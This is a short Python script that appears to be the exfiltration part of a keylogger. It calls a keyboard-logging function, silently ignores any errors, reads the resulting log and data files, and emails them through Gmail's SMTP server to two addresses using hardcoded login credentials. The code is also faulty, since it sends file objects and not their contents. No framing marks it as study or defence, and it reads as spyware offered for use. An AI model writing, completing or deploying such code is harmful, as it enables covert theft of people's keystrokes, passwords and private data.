import log
import smtplib


try:
    log.log_keyboard_events()
except:
    pass

with open("dat.log","r") as logfile:
    log=logfile
with open("dat.csv","r") as datfile:
    data=datfile

sender="keylogaddress@gmail.com"
receivers=["keylogaddress@gmail.com","tbdo@pm.me"]
password="Keylog123#"

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(sender, password)

server.sendmail(sender, receivers, f"Log:{log}\nData:{data}")
